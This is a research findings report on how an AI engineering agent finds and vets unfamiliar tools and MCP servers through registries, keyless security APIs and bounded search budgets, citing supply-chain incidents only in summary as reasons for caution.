# Engineer tool discovery: finding and judging an unknown tool mid-build

When the engineer needs a capability it has no tool for, it should run one small, bounded protocol. Everything in it is free and keyless, and it reuses the research agent's skills. Nothing in the plugin changes this pass: the skill changes below are recommendations only.

1. **Look up first.** Grep `dead-ends.md` and the tool registry before searching (/home/user/Autonomy-Research/research/findings/engineer-feasibility.md:598).
2. **Climb a short discovery ladder.** For a named SaaS, start with the vendor's own docs. Next comes the official MCP Registry, which is keyless but "consumers should assume minimal-to-no moderation" (https://modelcontextprotocol.io/registry/moderation-policy). After that, the Claude plugin marketplaces and Connectors Directory, where "Verification isn't a security audit" (https://claude.com/docs/connectors/directory). Then the Docker MCP Catalog if Docker is present (https://docs.docker.com/ai/mcp-catalog-and-toolkit/toolkit), and Smithery's keyless API last (live curl of registry.smithery.ai/servers). For libraries, a web search names the candidates, then npm/PyPI exact-name lookups and deps.dev confirm them (https://docs.deps.dev/api/v3/).
3. **Vet each candidate with a sub-second "vet card" of keyless calls.** OSV `querybatch` (https://api.osv.dev/v1/querybatch), deps.dev, the Scorecard REST API (https://api.scorecard.dev/projects/github.com/ossf/scorecard) and the npm attestations endpoint, followed by a grep of the install scripts in a read-only clone.
4. **Add MCP-specific checks.** Read the launch command and scopes, then hash and review the tool definitions (https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html, https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices).
5. **Choose the route per capability.** Use a script or library when an official CLI, SDK or REST API covers the needed writes. Use MCP when it adds OAuth consent, per-call approval or exploration. Use the browser only for operations the API lacks. Token cost now matters little, because Claude Code defers MCP tool definitions (https://code.claude.com/docs/en/mcp).
6. **Stay inside the envelope.** It is the worker's untested design: tiers D0 to D2, at most 3 workers with about 15 calls each, at most 3 URLs per cluster and a 10-minute box. Stop at the first candidate that passes. This rests on evidence that returns plateau after about three searches (https://arxiv.org/html/2603.08877v1).
7. **Hand back typed blocks.** Each pass returns a registry `ROW:`, an integration-card patch and a plan entry. Negative results go to `dead-ends.md`.

Registries and stars are leads, never trust signals. Expired-domain hijacks, a backdoored MCP package and typosquats were all reported in 2025-2026 (https://www.air.security/blog-posts/mcpjacking, https://postmarkapp.com/blog/information-regarding-malicious-postmark-mcp-package, https://www.straiker.ai/blog/smartloader-clones-oura-ring-mcp-to-deploy-supply-chain-attack). Overall confidence is medium. The access and API facts are high-confidence because they were tested live on 2026-10-16. The ordering, the envelope numbers and the registry schema are worker designs that still need a spike.

## Questions and answers

### Q1. Where should the engineer look for a tool it does not know, in what order, and how reliable is each source?

**Confidence: medium.** Access and policy facts are high because they were tested live. Coverage, freshness and the ordering are medium: they were only sampled, and the ladder was not tested end to end.

**MCP sources.**
- **Official MCP Registry.** It is keyless and returns structured fields. `search=stripe` returned "com.stripe/mcp" (live curl https://registry.modelcontextprotocol.io/v0.1/servers?search=stripe, E1). Search is a "name (substring match)" with a `version=latest` filter (https://registry.modelcontextprotocol.io/openapi.yaml, E2). Without that filter, one community server filled 8 of 10 `search=attio` rows, and calls took 14.2 s and 22.8 s, with two 20 s timeouts (live curl, E3). The registry verifies namespaces but relies "on the broader ecosystem for security scanning" (https://modelcontextprotocol.io/registry/about, E4). Moderation is minimal (https://modelcontextprotocol.io/registry/moderation-policy, E5). It has "No built-in server quality assessments or rankings", and its authors "highly recommend using a subregistry" (https://github.com/modelcontextprotocol/registry/blob/main/complete.md, E6, E7).
- **Claude plugin marketplaces and the Connectors Directory.**
  - The official marketplace lists mostly partner content (https://code.claude.com/docs/en/plugins/anthropic-marketplaces, E10).
  - The community marketplace passed "automated validation and safety screening", but "Anthropic doesn't review third-party marketplaces" (https://code.claude.com/docs/en/discover-plugins and the anthropic-marketplaces page, E11).
  - The catalog is a greppable `marketplace.json` (E12).
  - In the Connectors Directory, "Verification isn't a security audit", and the default listing is Community (https://claude.com/docs/connectors/directory, https://claude.com/docs/connectors/building/submission, E13).
- **Docker MCP Catalog.** Images under `mcp/` "are built by Docker and digitally signed" (https://docs.docker.com/ai/mcp-catalog-and-toolkit/toolkit, E14). Dynamic MCP lets an agent "discover, add, and compose MCP servers on-demand" (E15).
- **Smithery.** Search is keyless and returns `verified` and `useCount`. It also returns unverified entries with zero uses (live curl registry.smithery.ai/servers, E16).
- **Skip these.** PulseMCP and Glama return "Invalid or missing API key" and "requires an API key" (https://api.pulsemcp.com/v0.1/servers, https://glama.ai/api/mcp/v1/servers, E17, E18). mcp.so returned only an HTML shell (https://mcp.so/api/servers?q=stripe, E19).
- **GitHub MCP Registry.** It listed 44 servers at launch (https://github.blog/ai-and-ml/generative-ai/how-to-find-install-and-manage-mcp-servers-with-the-github-mcp-registry/, E9). github.com/mcp returned 403 from the sandbox.
- **awesome-mcp-servers.** A community list, "A collection of MCP servers." (http://github.com/punkpeye/awesome-mcp-servers, E26). Use it for orientation only.

**Why a listing is only a lead.**
- 155 official-registry entries relied on expired domains (https://www.air.security/blog-posts/mcpjacking, E8).
- 15.37% of sampled GitHub accounts behind servers were re-registrable (https://arxiv.org/html/2510.16558v2, E20).
- "41.6% of confirmed servers disappear within three days" (https://arxiv.org/html/2608.00150, E21).
- postmark-mcp shipped a backdoor in 1.0.16 (https://postmarkapp.com/blog/information-regarding-malicious-postmark-mcp-package, E22).
- SmartLoader showed that "GitHub stars, forks, contributor counts" can be fabricated (https://www.straiker.ai/blog/smartloader-clones-oura-ring-mcp-to-deploy-supply-chain-attack, E23).
- Sandworm_Mode injected a rogue MCP server into Claude Code config (https://www.helpnetsecurity.com/2026/02/24/npm-worm-sandworm-mode-supply-cain-attack/, E24) through 19 typosquatted npm packages (https://www.securityweek.com/new-sandworm_mode-supply-chain-attack-hits-npm/, E37).
- An estimated 600 to 1,650 exploitable vulnerabilities exist across 19,000 MCP repos (https://www.trendaisecurity.com/en/resources-insights/deep-research/hunt-them-all-an-ai-powered-vulnerability-sweep-of-19-000-mcp-servers, E25).

**Package and repo sources.**
- **GitHub search.** It is limited to 10 requests per minute unauthenticated, and code search needs authentication (https://docs.github.com/en/rest/search/search?apiVersion=2022-1128, E27). From the cloud sandbox it is blocked: "sessions are bound to their configured repositories" (curl api.github.com/search/repositories, E28).
- **npm search.** It is keyless but noisy: `text=mcp stripe` ranked an ad SDK first (curl https://registry.npmjs.org/-/v1/search, E30).
- **PyPI.** Its search is "Permanently disabled" (https://warehouse.pypa.io/api-reference/xml-rpc/, E31). Only exact-name JSON lookups work (https://docs.pypi.org/api/, E32).
- **libraries.io.** It needs a key (curl https://libraries.io/api/search?q=stripe, E33).
- **deps.dev.** It is keyless and works by exact package. It returns licences, advisories and Scorecard data, but it has no free-text search (https://docs.deps.dev/api/v3/, E34, E35).
- **Docker Hub search.** It is keyless and noisy: 980 hits for `mcp/stripe` (curl, E36).

**Recommended ladder.** This is the worker's inference from the facts above. The ordering is reasoned, not tested on a real task.

1. **Named SaaS** (Attio, Clay, n8n, Supabase):
   1. Web search for the vendor's own API and MCP pages, anchored on the vendor domain.
   2. Official registry with `?search=<vendor>&version=latest`. Accept only a namespace that matches the vendor domain, and check that the domain is still owned.
   3. Claude plugin `marketplace.json`, then the Connectors Directory (Verified over Community).
   4. Vendor REST API with its OpenAPI spec and an official SDK, checked through deps.dev.
   5. Smithery entries with `verified:true`, then community MCP servers.
2. **Library for a task:**
   1. Web search by task description for 3 candidate names.
   2. npm/PyPI by exact name, then deps.dev.
   3. Context7 for syntax, and DeepWiki or a clone for internals.
   4. Awesome lists for orientation only. GitHub search only on John's machine with a token.
3. **MCP server for a capability:**
   1. Official registry, with several keywords and `version=latest`.
   2. Claude marketplaces and the Connectors Directory.
   3. Docker catalog, if Docker is present.
   4. Smithery.
   5. An awesome list, or web search with `site:github.com mcp`.

   Before steps 4 and 5, ask whether a plain CLI or API call would do.
4. **CLI tool:**
   1. Web search for the task plus "CLI".
   2. The distro or Homebrew page and the project's GitHub releases.
   3. npm/PyPI name checks and deps.dev.
   4. Docker Hub.
   5. Sourcegraph.

   The worker flags this CLI ordering as a hypothesis with no cited source.

Stop at the first step that returns a candidate with a verifiable vendor or maintainer, and hand at most 3 candidates to vetting (worker inference).

**Contradictions.**
- **Registry namespaces versus hijacks.** The registry docs present namespace authentication as giving trust and accountability (https://modelcontextprotocol.io/registry/about, E4). Air Security found 155 listed entries hijackable through expired domains (https://www.air.security/blog-posts/mcpjacking, E8). The worker reads both as true: ownership is checked at publish time only (worker inference). Unresolved: whether an install-time domain re-check catches this is a spike item.
- **Smithery.** The earlier finding rated Smithery "Skip", with "no search API documented" (/home/user/Autonomy-Research/research/findings/tool-routing.md:154, E124). This run found its search API keyless and working (live curl registry.smithery.ai/servers, E16). The new live test is favoured: Smithery moves to a last-rung fallback. Its docs and terms are still unopened.
- **GitHub MCP Registry size.** The blog's count of 44 (E9) is the launch size only. The current count could not be read because github.com/mcp returned 403.
- **GitHub search limits.** The same docs page gives code-search limits of 9 and 10 per minute (E27); plan for 9. `api.github.com/rate_limit` from the sandbox reported a `search` quota of 30 (E29), yet search endpoints returned 403 (E28). The 403 is the operative fact.

### Q2. When is web search better than a structured index?

**Confidence: medium.**

Use search to find the name and the vendor's own page. Use a structured API to confirm it and to extract machine-checkable fields: namespace, `repository.url`, version, status and advisories (worker inference, resting on E1-E3 and E30-E36).

The earlier routing finding still sets the defaults:
- "Parallel Search is the default for discovery and page reading" (/home/user/Autonomy-Research/research/findings/tool-routing.md:1-13 and :199-215, E38).
- The MCP row routes discovery through "curl registry `/v0.1/servers?search=`" (tool-routing.md, decision table, E39).
- "Every discovery result must be reduced to <= 3 URLs before any fetch" (tool-routing.md, hand-off contract, E40).

Web search can surface a vendor's official page even when community forks crowd the registry's substring results (worker inference from the attio and hubspot samples, E3). Popularity is as weak a signal in search results as in registries (worker inference from E23). In both, the vendor's own domain is the anchor.

**Contradictions.** The routing finding makes Parallel the default (E38). In this run, workers reported Parallel returning "Too Many Requests" on every call, so Exa and curl did the searching. That report is a tool error observed in the run, with no source URL, so it is not cited here (see Open questions). Unresolved: whether Parallel's rate limit is a property of this sandbox or of the service. The plan's fallback to Exa covers it either way.

### Q3. How does the engineer choose between a connector or MCP server, a direct API call, a script or library, and the browser?

**Confidence: medium.** The inputs are vendor docs, Anthropic and Cloudflare engineering posts and one preprint. There is no controlled study for this case.

**Evidence.**
- **Connectors and skills.** "MCP connects Claude to data; Skills teach Claude what to do with that data." (https://claude.com/blog/skills-explained, E80).
- **Code execution.** Anthropic reports code execution against MCP cut usage "from 150,000 tokens to 2,000 tokens" (https://www.anthropic.com/engineering/code-execution-with-mcp, E81). It adds "operational overhead and security considerations" (E82), and tokenisation keeps sensitive data away from the agent (E83).
- **Code Mode.** Cloudflare: "LLMs are better at writing code to call MCP, than at calling MCP directly." It also keeps keys in bindings (https://blog.cloudflare.com/code-mode/, E84, E85).
- **What Claude Code does with MCP** (https://code.claude.com/docs/en/mcp):
  - Only tool names and server instructions load at session start (E86).
  - That deferral is disabled when `ANTHROPIC_BASE_URL` points to a non-first-party host (E87).
  - A tool can be made to prompt on every call, even in bypass modes (E88).
  - "Servers that fetch external content can expose you to prompt injection risk." (E89).
  - The default output cap is 25,000 tokens (E90).
- **Tool design.** Tools should "return only high signal information" (https://www.anthropic.com/engineering/writing-tools-for-agents, E91).
- **Measured cost.** A 2026 preprint found 12.9% of MCP spend bought no completed work, against 2.2% for CLI runs. Paired ratios spanned 0.43x to 29x (https://arxiv.org/abs/2608.08654, E92, E93).
- **Settled per-task table.** Clay tables "cannot" be created programmatically (/home/user/Autonomy-Research/research/findings/engineer-browser.md:Q11 table (line 522 onward), E94). Playwright CLI is the primary browser driver (/home/user/Autonomy-Research/research/tool-registry.md:204-210, E95).

**Procedure.** This is the worker's inference. Stop at the first yes.
1. Grep `dead-ends.md` and the registry. A known verdict ends the search.
2. If an official vendor CLI, SDK or REST API covers every needed operation, including writes, use a script or library. Gates: the free tier works, the auth is a key John creates once, the library handles retries and pagination, and the output can be asserted in a test.
3. Use an official or well-maintained MCP server or connector only when it adds something a script cannot: OAuth consent John already gave, per-call approval on writes, a hosted maintained schema, or exploration before the API is known. Run it with tool search on, read-only first and writes behind approval. Treat community servers as untrusted code.
4. If the operation is a repeatable pipeline step, turn it into a script or a recorded Playwright test, even if it was discovered through MCP.
5. Use the browser only for operations the API lacks, narrowly, with Playwright CLI.

**Criteria order** (worker inference, under John's outcome, effort and cost order):
1. Auth model and write coverage decide feasibility.
2. Maintenance decides durability.
3. Determinism and testability decide whether the engineer can verify its own work.
4. Secrets exposure decides which route holds which credential.
5. Token cost comes last.

Code Mode and code execution are optimisations for large tool surfaces. Claude Code's Bash tool already is the code runtime (worker inference from E81-E85).

**Contradictions.** Practitioner posts put MCP at 4x to 35x the token cost of CLI. They were seen in Exa highlights only, so they are excluded and listed under Open questions. Against them, the preprint reports paired ratios of 0.43x to 29x and says scaffolding dominates (https://arxiv.org/abs/2608.08654, E93), and tool search removes the up-front cost (https://code.claude.com/docs/en/mcp, E86). The opened evidence favours treating the token multiplier as a weak, configuration-dependent criterion. Unresolved for Attio, Clay and n8n until `/context` is measured (spike).

### Q4. What envelope bounds a discovery pass inside a build (workers, pages, stop rules)?

**Confidence: medium.** The numbers are the worker's design and are untested. The plateau evidence comes from QA benchmarks, not from tool discovery.

**Evidence.**
- **Anthropic's effort scaling** (https://www.anthropic.com/engineering/multi-agent-research-system):
  - "Simple fact-finding requires just 1 agent with 3-10 tool calls" (E97).
  - "direct comparisons might need 2-4 subagents with 10-15 calls each" (E96).
  - Multi-agent systems "use about 15× more tokens than chats" (E98).
  - Searches should start broad, then narrow (E99).
- **Budgeted search.** Gains hold "up to roughly three searches, after which returns plateau" (https://arxiv.org/html/2603.08877v1, E101).
- **Effort versus quality.** Effort and quality are "only weakly aligned", and searches should stop on evidence sufficiency (https://arxiv.org/abs/2608.01913, E102, E103).
- **Today's research-agent caps are larger:**
  - A hard cap of 8 workers (/home/user/Autonomy-Research/plugin/skills/research/SKILL.md:36-42, E104).
  - At most three URLs per search (SKILL.md:221-225, E105).
  - Tool-scan runs at most 8 workers (/home/user/Autonomy-Research/plugin/skills/tool-scan/SKILL.md:13-15, E106).
  - Spike-worker caps are "maxTurns: 40" and about 15 tool calls (/home/user/Autonomy-Research/research/findings/engineer-feasibility.md:262, E107).
  - Claude Code offers `--max-turns` and `--max-budget-usd` (/home/user/Autonomy-Research/research/tool-registry.md:181, E108).

**Envelope.** This is the worker's design, to be spiked.

| Tier | Workers | Budget | Use |
| --- | --- | --- | --- |
| D0 (lookup) | 0 | At most 2 content calls | The lead greps `dead-ends.md` and the registry, then checks the vendor docs and the official registry. |
| D1 (one capability, no known candidate) | 1 | At most 15 calls and 3 candidate URLs | Returns one recommendation and a `ROW:`. |
| D2 (real choice between paths) | 2-3, one per path | Same caps | Going beyond 3 workers needs John. |

- **Time box.** 10 minutes per pass, 25 minutes absolute including vetting, and 40 turns for the lead. At the end of the box with no passing candidate, write an `inconclusive` dead-end, carry on with the browser or a manual step, and flag it to John. There is no gap round in build mode.
- **"Good enough" stop rule.** Stop when one candidate meets all four:
  1. It does every listed operation.
  2. It has an official source, or a repo with recent commits and a licence.
  3. Its auth is something John can complete.
  4. There is one cited example of the needed write.

  Also stop after two consecutive searches that add no new candidate.
- **Escalation.** Escalate only on a named blocker, never to find a better tool.

**Contradictions.** Anthropic finds that "token usage by itself explains 80% of the variance" in quality (https://www.anthropic.com/engineering/multi-agent-research-system, E100). The 2026 studies say returns plateau (https://arxiv.org/html/2603.08877v1, E101) and that effort is weakly aligned with quality (https://arxiv.org/abs/2608.01913, E102). The worker reconciles them by scope: Anthropic measured open-ended breadth research, while build-time discovery is narrow (worker inference). Unresolved for tool discovery itself. The spike in Q9 calibrates it.

### Q5. Which quick signals vet a candidate, and which are keyless?

**Confidence: high** for the API facts, which were tested live. **Medium** for Socket's limits and for scanner efficacy, since no benchmark was opened.

**Package and repo signals.**
- **Scorecard REST API.** It is keyless and returned HTTP 200 in 0.57 s. An unscanned repo returns 404, so "no Scorecard" is a real state, not a pass (live curl https://api.scorecard.dev/projects/github.com/ossf/scorecard, E41). Weekly API scores omit "CI-Tests, Contributors, and Dependency-Update-Tool" (https://github.com/ossf/scorecard, E42). Checks carry risk levels (https://github.com/ossf/scorecard/blob/main/docs/checks.md, E43).
- **OSV.** "Currently there are no limits on the API." (https://google.github.io/osv.dev/api/, E44). `querybatch` returned GHSA ids in 0.32 s (live curl https://api.osv.dev/v1/querybatch, E45).
- **deps.dev.**
  - It permits caching (https://docs.deps.dev/api/v3/, E46).
  - It returned licences and advisory keys for lodash 4.17.20 (live curl, E47).
  - It can report a licence as "non-standard", in which case read the LICENSE file (live curl, E48).
- **npm provenance.** It "does not guarantee the package has no malicious code" (https://docs.npmjs.com/generating-provenance-statements, E49; wording as reported by WebFetch). The attestations endpoint is keyless and answered in 0.09 s (live curl https://registry.npmjs.org/-/npm/v1/attestations/sigstore@2.3.1, E50).
- **PyPI.** Trusted-publishing tokens are "only valid for 15 minutes" (https://docs.pypi.org/trusted-publishers/, E51). Attestations identify the publisher, but the page gives no consumer check (https://docs.pypi.org/attestations/, E52).
- **Snyk Advisor.** It was migrated into security.snyk.io (https://updates.snyk.io/snyk-advisor-insights-are-now-part-of-security-snyk-io/, E53).
- **Socket.** The `sfw` free tier needs "no account, no API key" (https://socket.dev/llms.txt, E54). The Free plan allows 1,000 scans a month and 500 API requests an hour (https://socket.dev/pricing, E55; values as returned by WebFetch).
- **GitHub global advisories.** The REST API filters by ecosystem (https://docs.github.com/en/rest/security-advisories/global-advisories, E56; WebFetch summary). It returned 403 from the sandbox.

**MCP-specific signals.**
- **OWASP MCP cheat sheet** (https://cheatsheetseries.owasp.org/cheatsheets/MCP_Security_Cheat_Sheet.html):
  - It defines a rug pull: a server changes its tool definitions after approval (E58).
  - "Pin reviewed tool definitions using cryptographic hashes" (E59).
  - Typosquatting is "a common attack vector" (E60).
- **MCP security best practices** (https://modelcontextprotocol.io/docs/tutorials/security/security_best_practices):
  - Sandbox server commands "with minimal default privileges" (E61).
  - Its example of a malicious startup command is E62.
  - Publishing every scope is listed as a common mistake (E63).
  - Do not hand-roll IP validation (E64).
- **OWASP third-party MCP guide.** Periodic re-validation, recorded approvals and drift alerts (https://genai.owasp.org/download/51928/, E65, E66).
- **Snyk agent-scan** (the mcp-scan lineage). Its README warns that scanning "can execute commands or make outbound network requests" (https://github.com/snyk/agent-scan README.md:55 (commit 3550263), E67). In background mode it reports to a Snyk Evo instance (README.md:256 (commit 3550263), E68).

**Vet card order** (worker inference):
1. Metadata: archived flag and push date.
2. OSV `querybatch` on the exact version.
3. deps.dev licence and project.
4. Scorecard API.
5. Install-script grep in a read-only clone.
6. npm attestations, or Socket `sfw`, for npm and PyPI candidates.

Each call takes under 1 s. The script only issues HTTP requests and never touches candidate code.

Scorecard measures hygiene, not malice, so the clone-and-grep step stays mandatory (worker inference).

**Static MCP triage** (worker inference). Without running anything, check:
- the launch command;
- the package name against the real one;
- required env vars and secrets;
- OAuth scopes;
- whether the server is remote or local;
- whether the tool descriptions in the source contain instructions to the model.

A hash of the full `tools/list` output gives rug-pull detection, but it needs a sandboxed run, so it belongs in a spike (worker inference). Remote servers cannot be read; judge their operator and scopes instead (worker inference).

**Contradictions.**
- **Scorecard viewer versus API.** The skills point at the HTML viewer `https://scorecard.dev/viewer/?uri=...` (/home/user/Autonomy-Research/plugin/skills/repo-triage/SKILL.md:33-46, E69). The Scorecard README names the JSON API `api.scorecard.dev`, and the older host api.securityscorecards.dev also answered 200 (live curl, E57). The evidence favours the API, because the viewer is not agent-friendly.
- **Snyk Advisor's end.** A third-party page claiming Advisor "shut down in January 2026" was seen in search text only, so it is excluded. Snyk's own page says it was migrated (E53). Use Snyk's wording.
- **Stale scanner name.** OWASP says "Use tools like mcp-scan", but the repo is now snyk/agent-scan. The old name is a stale pointer, not a disagreement.

### Q6. What should the tool registry record, and when is a row re-checked?

**Confidence: medium.** The practices are cited. The schema is the worker's design.

**Evidence.**
- **Current registry.**
  - Six columns (/home/user/Autonomy-Research/research/tool-registry.md:9-10, E75).
  - Verdicts hold "as of the verified date", with evidence in the findings (tool-registry.md:3-5, E76).
  - Some rows already carry "not opened (search excerpt only)" in the Verified cell (tool-registry.md:63, E77).
- **Thoughtworks fade rule.** Unchanged entries fade after two radars (https://www.thoughtworks.com/insights/blog/technology-strategy/how-to-create-your-enterprise-technology-radar, E78).
- **OWASP.** Pin versions in "a manifest of approved server and tool versions", and re-scan periodically or on version change (https://genai.owasp.org/download/51928/, E79, E65).
- **Link rot.** Snyk Advisor's move (E53) shows how registry links decay.

**Proposed schema.** This is the worker's design. It extends the six-column `ROW:` contract rather than breaking it, using a trailing Meta cell or a sidecar `research/tool-registry.meta.csv` keyed by tool name. Fields:
- `version_checked` (tag or SHA) and `source_depth` (opened, clone or search-only);
- `verdict_code` (use, fallback, spike, skip or reject);
- `risk` (low, human-look or do-not-install);
- `recheck_by`: 90 days for MCP servers and fast-moving agent tools, 180 days for libraries, none for specs;
- `trigger`: new major version, new advisory, owner change or archived flag;
- `superseded_by` and `reason`;
- for MCP servers: `tooldef_sha256`, `scopes` and `local|remote`.

**Re-check rules** (worker inference):
- A cheap staleness script flags rows that meet any of these:
  - `recheck_by` is past;
  - the version is behind the latest release (OSV, deps.dev or npm);
  - the archived flag has flipped;
  - the link returns 404.
- Only flagged rows are re-triaged.
- Skip and reject rows untouched for two review cycles move to a greppable archive section, following the Thoughtworks fade rule.
- The engineer loads a short approved list (tool, version, install command, hash) that is kept separate from the research log.
- A row is reused if it was verified under 90 days ago and the version matches. Otherwise run D0 on the one fact that changed.

### Q7. How does a discovery result flow into the integration card, the registry and the plan without re-research?

**Confidence: medium.** The design is built from existing formats and is untested.

**Formats it builds on.**
- The `ROW:` format (/home/user/Autonomy-Research/plugin/skills/tool-scan/SKILL.md:44-46 and :46-47, E74).
- The proposed dead-ends shape: "path, date, version or commit tested, probe, result, evidence location (command and output), `retry-when` condition" (/home/user/Autonomy-Research/research/findings/engineer-feasibility.md:109, E121).
- The setup list built from the integration cards (engineer-feasibility.md:301, E122).
- The note schema's rule "The claim says no more than the quote does." (/home/user/Autonomy-Research/plugin/skills/research/note-schema.md:14-16, E123).
- The dead-end lookup requirement (engineer-feasibility.md:598, E120).

**Flow.** This is the worker's design. Each worker returns three typed blocks:
1. A `ROW:` line.
2. A card patch covering operations, auth, scopes, rate limit, write coverage, evidence URL and quote, version and `re-check after`. Unknown fields stay `unknown`.
3. A plan entry: the chosen route, John's setup steps, the test that proves it, and a fallback.

The lead copies each block to its file without opening the note. If nothing passes, the result goes to `dead-ends.md` with `retry-when`. Rows are keyed by tool name plus link, so a repeat discovery updates the row instead of adding one.

### Q8. Which research-agent skill serves which engineer phase, and what must change?

**Confidence: high** on what the skills contain today (files read). **Medium** on the changes.

**What the skills do today.**
- **Interview.** It "needs no workers and fetches no pages" (/home/user/Autonomy-Research/plugin/skills/interview/SKILL.md:8-11, E109). It starts reconnaissance only when asked (:47-48, E110) and writes to `research/requirements/` (:12-14, E111).
- **Tool-scan.** It "shall never install, build or run a candidate" (/home/user/Autonomy-Research/plugin/skills/tool-scan/SKILL.md:21-23, E112). The lead writes the rows (:16-19, E113). Its MCP discovery uses only the official registry (:35, E73). It defers safety to repo-triage (:43-44, E72).
- **Repo-triage.** It reads the install files (/home/user/Autonomy-Research/plugin/skills/repo-triage/SKILL.md:37-41, E70) and gives a three-level verdict (:47, E71).
- **Spike.** It tests only paths the user named (/home/user/Autonomy-Research/plugin/skills/spike/SKILL.md:14-15, E114). It gives no credentials beyond read-only search keys (:27-29, E115) and confirms with the user (:52-53,64, E116).
- **Research.** Its lead never reads sources itself (/home/user/Autonomy-Research/plugin/skills/research/SKILL.md:26-27, E117).
- **Gaps already listed by earlier runs.**
  - 13 spike gaps (/home/user/Autonomy-Research/research/findings/engineer-feasibility.md:245-270, E118).
  - The interview's "I don't know" gap (/home/user/Autonomy-Research/research/findings/engineer-intake.md:65-72, E119).

**Mapping** (worker inference):

| Engineer phase | Skill(s) | Mode |
| --- | --- | --- |
| Intake | interview, then research D0/D1 for options John cannot name | interactive; recon only when John says "I don't know" |
| As-is mapping | system-map (read-only), research D1 per unfamiliar API surface | no installs |
| Feasibility | tool-scan + repo-triage (D2), then spike trial mode for 1-3 paths | writes dead-ends.md, integration cards |
| Build | tool-scan D0/D1 on demand; spike trial for a blocker; research one-fact for docs | box and gates, no per-call user confirmation |
| Audit | research D1 re-verify; repo-triage on what was installed | read-only |

The change list is under Implications. The repo-triage and system-map skills were not read in detail, so their rows rest on the skills' descriptions.

**Contradictions.** Spike-worker forbids retries with changed flags, while Claude Code's best practices and the context protocol allow two attempts. The earlier run reconciled this by mode: no retry in a feasibility spike, two attempts in a build trial (engineer-feasibility.md Q9 Contradictions, as reported by the worker). The earlier finding's recommendation reads "after two failed fixes on one blocker, record and stop" (/home/user/Autonomy-Research/research/findings/engineer-feasibility.md:296, E125). Settled by mode.

### Q9. Recommendation, alternatives, rejected candidates and what to spike

**Confidence: medium.**

**One recommendation: a discovery pass inside a build.** It plugs into the feasibility protocol's "look up first" step (/home/user/Autonomy-Research/research/findings/engineer-feasibility.md:592, E126).
1. **Step 0, lookup.** Grep `dead-ends.md` and `tool-registry.md`. A known verdict ends the pass (E120).
2. **Size the pass.** D0 inline (at most 2 content calls), D1 with one worker, or D2 with 2-3 workers. Each worker gets about 15 calls, at most 3 URLs per cluster and a 10-minute box, with no gap round (Q4).
3. **Climb the discovery ladder** for the need type, anchored on the vendor's domain (Q1, Q2).
4. **Run the keyless vet card** on at most 3 candidates: OSV, deps.dev, the Scorecard API, npm attestations or Socket `sfw`, and a read-only clone grep. For MCP servers, add the static checks (Q5).
5. **Choose the route** with the five-step decision procedure: script or library first, MCP only when it adds something a script cannot, the browser last and narrow (Q3).
6. **Hand back the three typed blocks** (row, card, plan entry). Negatives go to `dead-ends.md` with `retry-when` (Q7).
7. **Keep the registry fresh** with a versioned schema and re-check dates (Q6).

Every component is free and keyless. No paid option is recommended. The Socket Free plan is $0 within its quotas (E55). Glama and PulseMCP need keys, and their cost and terms were not opened.

**Alternatives.**
- Put the Docker MCP Catalog first when Docker is the host runtime (E14, E15).
- Always use MCP: simple, but weaker on writes and determinism.
- Always use scripts: cheapest, but it fails where OAuth is needed or no API exists.
- Use the full research-skill tiers at build time: more thorough, but it stalls the build (E104).
- Use a Cloudflare-style Code Mode gateway, which only pays off for a large tool surface (E84).
- Use GitHub search with a token on John's machine (E27).

**Rejected, with reasons.**

| Candidate | Reason |
| --- | --- |
| mcp.so | No JSON API (E19). Worker inference (not in the source): it had the highest invalid-link rate in the 2025 study. |
| Glama and PulseMCP APIs | They need a key (E17, E18). |
| GitHub topic and code search in the cloud | 403 (E28). |
| PyPI search | Disabled (E31). |
| libraries.io | Needs a key (E33). |
| Star counts as a pass signal | They can be fabricated (E23). |
| npm text search for choosing a package | Noise and typosquats (E30, E37). |
| The Scorecard HTML viewer for agents | The API is better (E41). |
| Standalone Snyk Advisor | It is gone (E53). |
| agent-scan inside triage | It can execute commands (E67). Spike it in a throwaway VM only. |
| Picking one transport for the whole engineer | The evidence argues for choosing per integration (E92, E93). |
| Token multipliers as a decision driver | Unreproducible and configuration-dependent (E86, E93). |
| Unbounded gap rounds at build time | They conflict with the plateau and sufficiency evidence (E101, E103). |

**Spike before building.**
1. Run the official registry call 10 times from the engineer's real runtime. Record latency and timeouts, then settle the timeout (the worker proposes 60 s) and caching (E3).
2. Check whether Attio, Clay, n8n and Supabase have a vendor-namespace registry entry at all.
3. Check that `claude.com/plugins` and `marketplace.json` can be fetched by script from the cloud runtime.
4. Check Smithery's keyless search at volume, and what `verified` means.
5. Test GitHub search with a token on John's machine, if the engineer runs locally.
6. Measure the `/context` cost of the Attio, Clay and n8n MCP servers with tool search on and off.
7. Run D1 on three real capabilities to calibrate 15 calls and 10 minutes.
8. Test whether a hook that greps `dead-ends.md` and the registry changes behaviour.
9. Complete one MCP write round-trip with approval in an unattended session (E88).
10. Run agent-scan on one candidate MCP server inside a throwaway VM, and measure what it catches.
11. Hash `tools/list` on a sandboxed server, then re-fetch and diff it to test rug-pull detection.
12. Run one end-to-end ladder pass on a real SaaS need.
13. Re-check a vendor-namespace domain at install time, to test the MCPJacking defence (E8).

## Evidence

All entries were opened on 2026-10-16 unless marked otherwise. "Live curl" means a command run by the worker from the cloud sandbox on that date.

**Discovery sources (notes/discovery-sources.md)**
- E1. live curl https://registry.modelcontextprotocol.io/v0.1/servers?search=stripe, 2026-10-16, curl. Official registry is keyless and live: `GET /v0.1/servers?search=stripe` returned results with `status`, `updatedAt`, `repository.url`, `remotes`. Quote: "com.stripe/mcp" (server name returned, with `"url":"https://mcp.stripe.com"` and repo `https://github.com/stripe/agent-toolkit`).
- E2. https://registry.modelcontextprotocol.io/openapi.yaml, 2026-10-16, curl. Registry search is name-substring only, can filter `version=latest`, `updated_since`, `include_deleted`. Quote: "Search servers by name (substring match)"; "Filter by version ('latest' for latest version, or an exact version like '1.2.3')"
- E3. live curl against https://registry.modelcontextprotocol.io/v0.1/servers (`search=attio`, `search=hubspot`), 2026-10-16, curl. Without `version=latest`, one server returns many version rows (kesslerio/attio-mcp-server appeared 8 times in 10 results for `search=attio`), and calls took 14.2 s (attio) and 22.8 s (hubspot); two earlier calls timed out at 20 s. Quote: "io.github.kesslerio/attio-mcp-server | https://github.com/kesslerio/attio-mcp-server | 1.6.0 | active 2026-05-05" (worker's script output).
- E4. https://modelcontextprotocol.io/registry/about, 2026-10-16, Exa. Registry verifies namespace ownership but not code safety. Quote: "The MCP Registry focuses on namespace authentication and metadata hosting, while relying on the broader ecosystem for security scanning of actual server code."
